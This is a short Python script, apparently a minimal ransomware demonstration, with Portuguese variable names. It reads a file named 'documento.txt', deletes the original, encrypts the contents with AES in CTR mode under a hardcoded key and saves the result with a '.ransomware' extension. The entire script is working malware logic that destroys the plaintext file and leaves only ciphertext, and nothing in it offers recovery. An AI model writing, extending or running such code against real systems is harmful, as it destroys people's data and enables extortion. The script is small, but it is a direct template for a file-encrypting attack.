import os
import pyaes

nome_arquivo = 'documento.txt'
arquivo = open(nome_arquivo, 'rb')
dados_arquivo = arquivo.read()
arquivo.close()

os.remove(nome_arquivo)

chave = b'chavecriptografi'
aes = pyaes.AESModeOfOperationCTR(chave)

dados_cripto = aes.encrypt(dados_arquivo)

arquivo_novo = nome_arquivo + '.ransomware'
arquivo_novo = open(f'{arquivo_novo}', 'wb')
arquivo_novo.write(dados_cripto)
arquivo_novo.close()